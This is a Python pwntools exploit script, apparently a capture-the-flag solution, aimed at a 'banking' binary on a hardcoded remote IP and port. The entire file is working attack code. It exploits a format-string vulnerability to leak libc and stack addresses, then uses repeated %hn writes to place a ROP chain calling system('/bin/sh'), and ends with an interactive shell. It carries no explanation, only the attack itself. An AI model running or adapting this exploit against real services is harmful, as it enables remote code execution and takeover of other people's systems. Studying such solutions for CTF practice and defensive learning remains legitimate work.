#!/usr/bin/python3

from pwn import *

exe = ELF('banking_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                brva 0x1656

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('103.163.24.78', 10002)
else:
    p = process(exe.path)

GDB()


def reg(name, passs='a'):
    sla(b'> ', b'2')
    sla(b': ', b'aaaaaaaa')
    sla(b': ', passs)
    sla(b': ', name)


def login(passs='a'):
    sla(b'> ', b'1')
    sla(b': ', b'aaaaaaaa')
    sla(b': ', passs)


def infoo():
    sla(b'> ', b'3')


def out():
    sla(b'> ', b'4')
    sla(b': ', b'2')


# leak libc, stack
reg("%49$p|%6$p|")
login()
infoo()
libc.address = int(p.recvuntil(b"|", drop=True), 16) - 0x23a90
stack = int(p.recvuntil(b"|", drop=True), 16) + 0x28
info("libc.addres: " + hex(libc.address))
info("libc.addres: " + hex(stack))
pop_rdi = 0x00000000000240e5 + libc.address
ret = pop_rdi + 1
binsh = next(libc.search(b'/bin/sh'))
system = libc.sym.system

# write ret
package = {
    ret & 0xffff: stack,
    ret >> 16 & 0xffff: stack+2,
    ret >> 32 & 0xffff: stack+4,
}
order = sorted(package)

pa1 = p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
pa2 = f'%{order[0]}c%20$hn%{order[1]-order[0]}c%21$hn%{order[2]-order[1]}c%22$hn'.encode()
out()
reg(pa2, pa1)
login(pa1)
infoo()
stack += 8
# write pop rdi
package = {
    pop_rdi & 0xffff: stack,
    pop_rdi >> 16 & 0xffff: stack+2,
    pop_rdi >> 32 & 0xffff: stack+4,
}
order = sorted(package)

pa1 = p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
pa2 = f'%{order[0]}c%20$hn%{order[1]-order[0]}c%21$hn%{order[2]-order[1]}c%22$hn'.encode()
out()
reg(pa2, pa1)
login(pa1)
infoo()

stack += 8
# write binsh
package = {
    binsh & 0xffff: stack,
    binsh >> 16 & 0xffff: stack+2,
    binsh >> 32 & 0xffff: stack+4,
}
order = sorted(package)

pa1 = p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
pa2 = f'%{order[0]}c%20$hn%{order[1]-order[0]}c%21$hn%{order[2]-order[1]}c%22$hn'.encode()
out()
reg(pa2, pa1)
login(pa1)
infoo()

stack += 8
# write system
package = {
    system & 0xffff: stack,
    system >> 16 & 0xffff: stack+2,
    system >> 32 & 0xffff: stack+4,
}
order = sorted(package)

pa1 = p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
pa2 = f'%{order[0]}c%20$hn%{order[1]-order[0]}c%21$hn%{order[2]-order[1]}c%22$hn'.encode()
out()
reg(pa2, pa1)
login(pa1)
infoo()
# get shell
sla(b'> ', b'3')
out()
sla(b'> ', b'3')

p.interactive()
